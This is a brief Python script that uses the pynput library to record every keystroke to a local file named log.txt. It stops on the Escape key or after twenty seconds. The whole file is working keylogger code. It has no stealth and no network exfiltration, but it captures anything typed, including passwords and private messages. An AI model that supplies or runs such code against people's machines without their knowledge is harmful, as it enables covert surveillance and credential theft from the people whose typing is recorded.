import signal
import os
import time
import sys
from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == "Key.enter":
        letter = "\n"
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.esc":
        return False
    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    # change according to requirement signal.alarm(time in second)
    time.sleep(20)
    sys.exit()
    #signal.alarm(20)    # Tested in ubuntu
    l.join()